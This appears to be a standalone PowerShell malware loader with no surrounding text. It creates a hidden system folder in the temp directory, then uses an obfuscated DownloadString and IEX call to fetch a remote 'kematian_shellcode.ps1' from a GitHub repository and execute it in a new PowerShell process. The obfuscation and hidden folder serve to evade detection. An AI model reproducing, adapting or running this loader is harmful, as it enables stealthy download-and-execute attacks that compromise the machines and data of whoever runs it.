$dir = "$env:temp\loader"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir
cd $dir
Set-Location -Path $dir

$shellcode = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
